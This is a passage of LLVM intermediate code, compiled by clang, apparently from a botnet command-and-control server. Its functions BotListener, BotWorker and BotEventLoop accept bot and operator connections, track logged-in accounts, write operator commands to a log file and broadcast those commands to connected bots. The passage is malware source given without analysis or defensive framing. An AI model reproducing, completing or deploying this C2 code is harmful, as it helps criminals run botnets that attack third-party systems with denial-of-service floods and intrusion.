  %1047 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1048 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.65, i64 0, i64 0), i8* %1046, i8* %1047)
  %1049 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.66, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i64 0, i64 0))
  store %struct._IO_FILE* %1049, %struct._IO_FILE** %67, align 8
  %1050 = call i64 @time(i64* null) #9
  store i64 %1050, i64* %68, align 8
  %1051 = call %struct.tm* @gmtime(i64* %68) #9
  store %struct.tm* %1051, %struct.tm** %69, align 8
  %1052 = getelementptr inbounds [50 x i8], [50 x i8]* %70, i64 0, i64 0
  %1053 = load %struct.tm*, %struct.tm** %69, align 8
  %1054 = call i64 @strftime(i8* %1052, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.68, i64 0, i64 0), %struct.tm* %1053) #9
  %1055 = load %struct._IO_FILE*, %struct._IO_FILE** %67, align 8
  %1056 = getelementptr inbounds [50 x i8], [50 x i8]* %70, i64 0, i64 0
  %1057 = load i32, i32* %5, align 4
  %1058 = sext i32 %1057 to i64
  %1059 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %1058
  %1060 = getelementptr inbounds %struct.login_info, %struct.login_info* %1059, i32 0, i32 0
  %1061 = getelementptr inbounds [100 x i8], [100 x i8]* %1060, i64 0, i64 0
  %1062 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1063 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1055, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i64 0, i64 0), i8* %1056, i8* %1061, i8* %1062)
  %1064 = load %struct._IO_FILE*, %struct._IO_FILE** %67, align 8
  %1065 = call i32 @fclose(%struct._IO_FILE* %1064)
  %1066 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1067 = load i32, i32* %4, align 4
  %1068 = load i32, i32* %5, align 4
  %1069 = sext i32 %1068 to i64
  %1070 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %1069
  %1071 = getelementptr inbounds %struct.login_info, %struct.login_info* %1070, i32 0, i32 0
  %1072 = getelementptr inbounds [100 x i8], [100 x i8]* %1071, i64 0, i64 0
  call void @broadcast(i8* %1066, i32 %1067, i8* %1072)
  %1073 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %1073, i8 0, i64 2048, i1 false)
  br label %428, !llvm.loop !19

1074:                                             ; preds = %428
  br label %1075

1075:                                             ; preds = %1074, %1035, %1018, %1017, %1009, %1001, %993, %985, %977, %949, %933, %925, %917, %909, %901, %893, %885, %877, %869, %852, %836, %828, %820, %812, %804, %796, %788, %780, %772, %755, %739, %731, %723, %715, %707, %699, %691, %683, %675, %658, %642, %613, %596, %588, %580, %572, %564, %556, %548, %540, %532, %524, %489, %419, %403, %395, %387, %379, %371, %363, %355, %347, %323, %322, %315, %306, %298, %289, %281, %272, %264, %255, %247, %238, %230, %180, %174, %159, %131, %125
  %1076 = load i32, i32* %4, align 4
  %1077 = sext i32 %1076 to i64
  %1078 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1077
  %1079 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1078, i32 0, i32 0
  store i32 0, i32* %1079, align 4
  %1080 = load i32, i32* %4, align 4
  %1081 = call i32 @close(i32 %1080)
  %1082 = load volatile i32, i32* @OperatorsConnected, align 4
  %1083 = add nsw i32 %1082, -1
  store volatile i32 %1083, i32* @OperatorsConnected, align 4
  br label %1084

1084:                                             ; preds = %1075, %474, %466, %458
  %1085 = load i8*, i8** %2, align 8
  ret i8* %1085
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.70, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.71, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.72, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.73, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.74, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.75, i64 0, i64 0))
  %30 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.76, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.77, i64 0, i64 0))
  store %struct._IO_FILE* %30, %struct._IO_FILE** @telFD, align 8
  %31 = load i8**, i8*** %6, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33) #8
  store i32 %34, i32* %9, align 4
  %35 = load i8**, i8*** %6, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @create_and_bind(i8* %37)
  store volatile i32 %38, i32* @listenFD, align 4
  %39 = load volatile i32, i32* @listenFD, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %23
  call void @abort() #11
  unreachable

42:                                               ; preds = %23
  %43 = load volatile i32, i32* @listenFD, align 4
  %44 = call i32 @make_socket_non_blocking(i32 %43)
  store i32 %44, i32* %8, align 4
  %45 = load i32, i32* %8, align 4
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @abort() #11
  unreachable

48:                                               ; preds = %42
  %49 = load volatile i32, i32* @listenFD, align 4
  %50 = call i32 @listen(i32 %49, i32 4096) #9
  store i32 %50, i32* %8, align 4
  %51 = load i32, i32* %8, align 4
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %53, label %54

53:                                               ; preds = %48
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i64 0, i64 0))
  call void @abort() #11
  unreachable

54:                                               ; preds = %48
  %55 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %55, i32* @epollFD, align 4
  %56 = load volatile i32, i32* @epollFD, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

58:                                               ; preds = %54
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.79, i64 0, i64 0))
  call void @abort() #11
  unreachable

59:                                               ; preds = %54
  %60 = load volatile i32, i32* @listenFD, align 4
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %62 = bitcast %union.epoll_data* %61 to i32*
  store i32 %60, i32* %62, align 1
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %63, align 1
  %64 = load volatile i32, i32* @epollFD, align 4
  %65 = load volatile i32, i32* @listenFD, align 4
  %66 = call i32 @epoll_ctl(i32 %64, i32 1, i32 %65, %struct.epoll_event* %11) #9
  store i32 %66, i32* %8, align 4
  %67 = load i32, i32* %8, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %70

69:                                               ; preds = %59
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  call void @abort() #11
  unreachable

70:                                               ; preds = %59
  %71 = load i32, i32* %9, align 4
  %72 = add nsw i32 %71, 2
  %73 = zext i32 %72 to i64
  %74 = call i8* @llvm.stacksave()
  store i8* %74, i8** %12, align 8
  %75 = alloca i64, i64 %73, align 16
  store i64 %73, i64* %13, align 8
  br label %76

76:                                               ; preds = %80, %70
  %77 = load i32, i32* %9, align 4
  %78 = add nsw i32 %77, -1
  store i32 %78, i32* %9, align 4
  %79 = icmp ne i32 %77, 0
  br i1 %79, label %80, label %86

80:                                               ; preds = %76
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i64, i64* %75, i64 %83
  %85 = call i32 @pthread_create(i64* %84, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %76, !llvm.loop !20

86:                                               ; preds = %76
  %87 = getelementptr inbounds i64, i64* %75, i64 0
  %88 = load i32, i32* %10, align 4
  %89 = sext i32 %88 to i64
  %90 = inttoptr i64 %89 to i8*
  %91 = call i32 @pthread_create(i64* %87, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %90) #9
  br label %92

92:                                               ; preds = %93, %86
  br label %93

93:                                               ; preds = %92
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.80, i64 0, i64 0))
  %94 = call i32 @sleep(i32 60)
  br label %92
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.82, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.83, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.84, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
